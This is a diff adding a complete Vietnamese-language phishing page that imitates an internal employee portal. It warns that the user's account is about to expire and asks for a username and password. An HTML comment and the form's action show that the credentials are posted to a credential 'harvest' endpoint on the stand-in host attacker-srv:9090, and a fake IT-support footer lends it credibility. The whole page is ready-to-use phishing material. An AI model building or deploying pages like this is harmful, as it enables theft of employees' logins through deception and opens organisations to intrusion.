@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Cong noi bo - Xac nhan tai khoan</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: Arial, sans-serif; background: #eff6ff;
+           display: flex; align-items: center; justify-content: center;
+           min-height: 100vh; }
+    .card { background: #fff; border-radius: 10px; padding: 40px 36px;
+            width: 360px; box-shadow: 0 4px 16px rgba(0,0,0,.10); }
+    .logo { text-align: center; font-size: 22px; font-weight: bold;
+            color: #1d4ed8; margin-bottom: 4px; }
+    .sub  { text-align: center; font-size: 13px; color: #6b7280;
+            margin-bottom: 20px; }
+    .warn { background: #fef9c3; border: 1px solid #fbbf24;
+            border-radius: 6px; padding: 10px 12px; font-size: 12px;
+            color: #92400e; margin-bottom: 20px; }
+    label { display: block; font-size: 13px; color: #374151;
+            margin-bottom: 4px; font-weight: 600; }
+    input { width: 100%; padding: 9px 11px; border: 1px solid #d1d5db;
+            border-radius: 6px; font-size: 14px; margin-bottom: 14px;
+            outline: none; }
+    input:focus { border-color: #3b82f6;
+                  box-shadow: 0 0 0 2px rgba(59,130,246,.2); }
+    button { width: 100%; padding: 11px; background: #1d4ed8;
+             color: #fff; border: none; border-radius: 6px;
+             font-size: 15px; font-weight: 600; cursor: pointer; }
+    button:hover { background: #1e40af; }
+    .footer { text-align: center; font-size: 11px; color: #9ca3af;
+              margin-top: 16px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">&#128274; Cong Noi Bo</div>
+    <div class="sub">He thong quan tri tai khoan nhan vien</div>
+    <div class="warn">
+      &#9888; Tai khoan cua ban sap het han.<br>
+      Vui long dang nhap de gia han va xac nhan thong tin.
+    </div>
+    <!-- Form gui len harvest_server tren attacker-srv:9090 -->
+    <form method="POST" action="http://attacker-srv:9090/harvest">
+      <label for="username">Ten dang nhap</label>
+      <input id="username" type="text" name="username"
+             placeholder="Email hoac ma nhan vien" required autocomplete="off">
+      <label for="password">Mat khau</label>
+      <input id="password" type="password" name="password"
+             placeholder="Nhap mat khau" required autocomplete="off">
+      <button type="submit">Xac nhan &amp; Gia han</button>
+    </form>
+    <div class="footer">
+      &copy; 2024 He thong Noi bo &nbsp;|&nbsp; Ho tro: it-support@company.vn
+    </div>
+  </div>
+</body>
+</html>
